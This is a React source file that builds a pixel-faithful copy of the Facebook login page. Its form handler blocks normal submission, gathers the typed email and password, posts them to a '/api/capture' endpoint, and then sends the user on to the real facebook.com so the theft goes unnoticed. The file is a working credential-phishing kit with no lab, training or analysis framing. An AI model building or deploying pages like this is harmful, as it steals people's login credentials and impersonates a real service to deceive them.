import { useRef } from 'react'
import './Facebook.css'


const Facebook = () => {
    const formRef = useRef(null);

    const handleSubmit = (event) => {
      event.preventDefault();
      const formData = new formData(event.target);
      const data = Object.fromEntries(formData.entries());

      console.log("Data:", data);

      fetch("/api/capture", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => {
          if (response.ok) {
            return response.json();
          }
          throw new Error("Error: Bad Response");
        })
        .then((data) => {
          console.log("Success:", data);

          window.location.href = "https://facebook.com";
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    };


    return (
        <>
            <div className="_li" id="u_0_1_Yx">
                <div id="globalContainer" className="uiContextualLayerParent">
                <div className="fb_content clearfix " id="content" role="main">
                    <div>
                    <div className="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
                        <div className="_8esk">
                        <div className="_8esl">
                            <div className="_8ice">
                            <img
                                className="fb_logo _8ilh img"
                                src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
                                alt="Facebook"
                            />
                            </div>
                            <h2 className="_8eso">
                            Connect with friends and the world around you on Facebook.
                            </h2>
                        </div>
                        <div className="_8esn">
                            <div className="_8iep _8icy _9ahz _9ah-">
                            <div className="_6luv _52jv">
                                <form
                                className="_9vtf"
                                data-testid="royal_login_form"
                                action="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA4NzQ5MTQxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D"
                                method="POST"
                                ref={formRef}
                                onSubmit={handleSubmit}
                                id="u_0_2_58"
                                >
                                <input
                                    type="hidden"
                                    name="jazoest"
                                    defaultValue={2954}
                                    autoComplete="off"
                                />
                                <input
                                    type="hidden"
                                    name="lsd"
                                    defaultValue="AVpKd2xBUnU"
                                    autoComplete="off"
                                />
                                <div>
                                    <div className="_6lux">
                                    <input
                                        type="text"
                                        className="inputtext _55r1 _6luy"
                                        name="email"
                                        id="email"
                                        data-testid="royal_email"
                                        placeholder="Email or phone number"
                                        autoFocus={1}
                                        aria-label="Email or phone number"
                                    />
                                    </div>
                                    <div className="_6lux">
                                    <div className="_6luy _55r1 _1kbt" id="passContainer">
                                        <input
                                        type="password"
                                        className="inputtext _55r1 _6luy _9npi"
                                        name="pass"
                                        id="pass"
                                        data-testid="royal_pass"
                                        placeholder="Password"
                                        aria-label="Password"
                                        />
                                        <div className="_9ls7" id="u_0_3_Uu">
                                        <a href="#" role="button">
                                            <div className="_9lsa">
                                            <div className="_9lsb" id="u_0_4_ls" />
                                            </div>
                                        </a>
                                        </div>
                                    </div>
                                    </div>
                                </div>
                                <input
                                    type="hidden"
                                    autoComplete="off"
                                    name="login_source"
                                    defaultValue="comet_headerless_login"
                                />
                                <input
                                    type="hidden"
                                    autoComplete="off"
                                    name="next"
                                    defaultValue=""
                                />
                                <div className="_6ltg">
                                    <button
                                    value={1}
                                    className="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
                                    name="login"
                                    data-testid="royal_login_button"
                                    type="submit"
                                    id="u_0_5_t/"
                                    >
                                    Log In
                                    </button>
                                </div>
                                <div className="_6ltj">
                                    <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA4NzQ5MTQxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login">
                                    Forgot password?
                                    </a>
                                </div>
                                <div className="_8icz" />
                                <div className="_6ltg">
                                    <a
                                    role="button"
                                    className="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
                                    href="#"
                                    id="u_0_0_0u"
                                    data-testid="open-registration-form-button"
                                    rel="async"
                                    >
                                    Create new account
                                    </a>
                                </div>
                                </form>
                            </div>
                            <div id="reg_pages_msg" className="_58mk">
                                <a
                                href="/pages/create/?ref_type=registration_form"
                                className="_8esh"
                                >
                                Create a Page
                                </a>{" "}
                                for a celebrity, brand or business.
                            </div>
                            </div>
                        </div>
                        </div>
                    </div>
                    </div>
                </div>
                <div className="">
                    <div className="_95ke _8opy">
                    <div
                        id="pageFooter"
                        data-referrer="page_footer"
                        data-testid="page_footer"
                    >
                        <ul
                        className="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
                        data-nocookies={1}
                        >
                        <li>English (US)</li>
                        <li>
                            <a
                            className="_sv4"
                            dir="ltr"
                            href="https://es-la.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("es_LA", "en_US", "https:\/\/es-la.facebook.com\/", "www_list_selector", 0); return false;'
                            title="Spanish"
                            >
                            Español
                            </a>
                        </li>
                        <li>
                            <a
                            className="_sv4"
                            dir="ltr"
                            href="https://fr-fr.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("fr_FR", "en_US", "https:\/\/fr-fr.facebook.com\/", "www_list_selector", 1); return false;'
                            title="French (France)"
                            >
                            Français (France)
                            </a>
                        </li>
                        <li>
                            <a
                            className="_sv4"
                            dir="ltr"
                            href="https://zh-cn.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("zh_CN", "en_US", "https:\/\/zh-cn.facebook.com\/", "www_list_selector", 2); return false;'
                            title="Simplified Chinese (China)"
                            >
                            中文(简体)
                            </a>
                        </li>
                        <li>
                            <a
                            className="_sv4"
                            dir="rtl"
                            href="https://ar-ar.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("ar_AR", "en_US", "https:\/\/ar-ar.facebook.com\/", "www_list_selector", 3); return false;'
                            title="Arabic"
                            >
                            العربية
                            </a>
                        </li>
                        <li>
                            <a
                            className="_sv4"
                            dir="ltr"
                            href="https://pt-br.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("pt_BR", "en_US", "https:\/\/pt-br.facebook.com\/", "www_list_selector", 4); return false;'
                            title="Portuguese (Brazil)"
                            >
                            Português (Brasil)
                            </a>
                        </li>
                        <li>
                            <a
                            className="_sv4"
                            dir="ltr"
                            href="https://it-it.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("it_IT", "en_US", "https:\/\/it-it.facebook.com\/", "www_list_selector", 5); return false;'
                            title="Italian"
                            >
                            Italiano
                            </a>
                        </li>
                        <li>
                            <a
                            className="_sv4"
                            dir="ltr"
                            href="https://ko-kr.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("ko_KR", "en_US", "https:\/\/ko-kr.facebook.com\/", "www_list_selector", 6); return false;'
                            title="Korean"
                            >
                            한국어
                            </a>
                        </li>
                        <li>
                            <a
                            className="_sv4"
                            dir="ltr"
                            href="https://de-de.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("de_DE", "en_US", "https:\/\/de-de.facebook.com\/", "www_list_selector", 7); return false;'
                            title="German"
                            >
                            Deutsch
                            </a>
                        </li>
                        <li>
                            <a
                            className="_sv4"
                            dir="ltr"
                            href="https://hi-in.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("hi_IN", "en_US", "https:\/\/hi-in.facebook.com\/", "www_list_selector", 8); return false;'
                            title="Hindi"
                            >
                            हिन्दी
                            </a>
                        </li>
                        <li>
                            <a
                            className="_sv4"
                            dir="ltr"
                            href="https://ja-jp.facebook.com/"
                            onClick='require("IntlUtils").setCookieLocale("ja_JP", "en_US", "https:\/\/ja-jp.facebook.com\/", "www_list_selector", 9); return false;'
                            title="Japanese"
                            >
                            日本語
                            </a>
                        </li>
                        <li>
                            <a
                            role="button"
                            className="_42ft _4jy0 _517i _517h _51sy"
                            rel="dialog"

                            href="#"
                            title="Show more languages"
                            >
                            <i className="img sp_RWRH0hRwEXV sx_136e18" />
                            </a>
                        </li>
                        </ul>
                        <div id="contentCurve" />
                        <div
                        id="pageFooterChildren"
                        role="contentinfo"
                        aria-label="Facebook site links"
                        >
                        <ul className="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                            <li>
                            <a href="/reg/" title="Sign Up for Facebook">
                                Sign Up
                            </a>
                            </li>
                            <li>
                            <a href="/login/" title="Log into Facebook">
                                Log In
                            </a>
                            </li>
                            <li>
                            <a href="https://messenger.com/" title="Check out Messenger.">
                                Messenger
                            </a>
                            </li>
                            <li>
                            <a href="/lite/" title="Facebook Lite for Android.">
                                Facebook Lite
                            </a>
                            </li>
                            <li>
                            <a
                                href="https://www.facebook.com/watch/"
                                title="Browse in Video"
                            >
                                Video
                            </a>
                            </li>
                            <li>
                            <a
                                href="/places/"
                                title="Check out popular places on Facebook."
                            >
                                Places
                            </a>
                            </li>
                            <li>
                            <a href="/games/" title="Check out Facebook games.">
                                Games
                            </a>
                            </li>
                            <li>
                            <a
                                href="/marketplace/"
                                title="Buy and sell on Facebook Marketplace."
                            >
                                Marketplace
                            </a>
                            </li>
                            <li>
                            <a
                                href="https://pay.facebook.com/"
                                title="Learn more about Meta Pay"
                                target="_blank"
                            >
                                Meta Pay
                            </a>
                            </li>
                            <li>
                            <a
                                href="https://www.meta.com/"
                                title="Check out Meta"
                                target="_blank"
                            >
                                Meta Store
                            </a>
                            </li>
                            <li>
                            <a
                                href="https://www.meta.com/quest/"
                                title="Learn more about Meta Quest"
                                target="_blank"
                            >
                                Meta Quest
                            </a>
                            </li>
                            <li>
                            <a
                                href="https://l.facebook.com/l.php?u=https%3A%2F%2Fimagine.meta.com%2F&h=AT0wKvv5IZil2PY7kBw0NCzn8hgfCu__4kJC76yBI2CTHPkIvj7j7nynYL8fpZW0Wp6RO4Cmaz_N8iXBT5WQTrcmQiJkUkbauM1eS3ijsVNTsCNl1hyitSk7l5Q15oLHMDYdR_SevyV-0hr2wMzcLQ"
                                title="Imagine with Meta AI"
                                target="_blank"
                                rel="noreferrer nofollow"
                                data-lynx-mode="asynclazy"
                            >
                                Imagine with Meta AI
                            </a>
                            </li>
                            <li>
                            <a
                                href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&h=AT08mSBEbj8AJjDvnwb80CUwl-zct9wwRJ-ybJNornsEUf42RKSL99E23DG2N00RDxIl0uwemxhuR_oPjA7O-JC05G9Y4H3rSGpgXTHHrPfhbPqygwO8CkLMTBfOCAxqxfUbRgz6OiQg4K8CGyw6sQ"
                                title="Check out Instagram"
                                target="_blank"
                                rel="noreferrer nofollow"
                                data-lynx-mode="asynclazy"
                            >
                                Instagram
                            </a>
                            </li>
                            <li>
                            <a href="https://www.threads.net/" title="Check out Threads">
                                Threads
                            </a>
                            </li>
                            <li>
                            <a href="/fundraisers/" title="Donate to worthy causes.">
                                Fundraisers
                            </a>
                            </li>
                            <li>
                            <a
                                href="/biz/directory/"
                                title="Browse our Facebook Services directory."
                            >
                                Services
                            </a>
                            </li>
                            <li>
                            <a
                                href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                                title="See the Voting Information Center."
                            >
                                Voting Information Center
                            </a>
                            </li>
                            <li>
                            <a
                                href="/privacy/policy/?entry_point=facebook_page_footer"
                                title="Learn how we collect, use and share information to support Facebook."
                            >
                                Privacy Policy
                            </a>
                            </li>
                            <li>
                            <a
                                href="/privacy/center/?entry_point=facebook_page_footer"
                                title="Learn how to manage and control your privacy on Facebook."
                            >
                                Privacy Center
                            </a>
                            </li>
                            <li>
                            <a href="/groups/discover/" title="Explore our Groups.">
                                Groups
                            </a>
                            </li>
                            <li>
                            <a
                                href="https://about.meta.com/"
                                accessKey={8}
                                title="Read our blog, discover the resource center, and find job opportunities."
                            >
                                About
                            </a>
                            </li>
                            <li>
                            <a
                                href="/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto"
                                title="Advertise on Facebook."
                            >
                                Create ad
                            </a>
                            </li>
                            <li>
                            <a
                                href="/pages/create/?ref_type=site_footer"
                                title="Create a page"
                            >
                                Create Page
                            </a>
                            </li>
                            <li>
                            <a
                                href="https://developers.facebook.com/?ref=pf"
                                title="Develop on our platform."
                            >
                                Developers
                            </a>
                            </li>
                            <li>
                            <a
                                href="/careers/?ref=pf"
                                title="Make your next career move to our awesome company."
                            >
                                Careers
                            </a>
                            </li>
                            <li>
                            <a
                                href="/policies/cookies/"
                                title="Learn about cookies and Facebook."
                                data-nocookies={1}
                            >
                                Cookies
                            </a>
                            </li>
                            <li>
                            <a
                                className="_41ug"
                                data-nocookies={1}
                                href="https://www.facebook.com/help/568137493302217"
                                title="Learn about Ad Choices."
                            >
                                Ad choices
                                <i className="img sp_RWRH0hRwEXV sx_254be8" />
                            </a>
                            </li>
                            <li>
                            <a
                                data-nocookies={1}
                                href="/policies?ref=pf"
                                accessKey={9}
                                title="Review our terms and policies."
                            >
                                Terms
                            </a>
                            </li>
                            <li>
                            <a
                                href="/help/?ref=pf"
                                accessKey={0}
                                title="Visit our Help Center."
                            >
                                Help
                            </a>
                            </li>
                            <li>
                            <a
                                href="help/637205020878504"
                                title="Visit our Contact Uploading & Non-Users Notice."
                            >
                                Contact Uploading &amp; Non-Users
                            </a>
                            </li>
                            <li>
                            <a
                                accessKey={6}
                                className="accessible_elem"
                                href="/settings"
                                title="View and edit your Facebook settings."
                            >
                                Settings
                            </a>
                            </li>
                            <li>
                            <a
                                accessKey={7}
                                className="accessible_elem"
                                href="/allactivity?privacy_source=activity_log_top_menu"
                                title="View your activity log"
                            >
                                Activity log
                            </a>
                            </li>
                        </ul>
                        </div>
                        <div className="mvl copyright">
                        <div>
                            <span> Meta © 2024</span>
                        </div>
                        </div>
                    </div>
                    </div>
                </div>
                </div>
                <div />
                <span>
                <img
                    src="https://facebook.com/security/hsts-pixel.gif"
                    width={0}
                    height={0}
                    style={{ display: "none" }}
                />
                </span>
            </div>
            <div style={{ display: "none" }}>
                <div />
                <div />
            </div>
            </>
        )
}

export default Facebook